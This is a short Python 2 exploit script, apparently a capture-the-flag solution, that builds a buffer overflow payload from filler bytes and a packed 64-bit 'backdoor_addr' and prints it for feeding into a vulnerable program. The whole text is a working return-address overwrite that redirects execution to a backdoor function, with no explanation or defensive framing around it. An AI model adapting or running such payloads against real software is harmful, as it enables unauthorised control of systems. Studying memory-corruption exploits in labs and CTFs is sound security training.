import struct

backdoor_addr = 0x55555555488c

exploit = ""

exploit += "A"*40 + '\xff'

exploit += "A"*286

exploit += struct.pack("I", backdoor_addr & 0xffffffff)

exploit += struct.pack("I", backdoor_addr >> 8*4)

print exploit
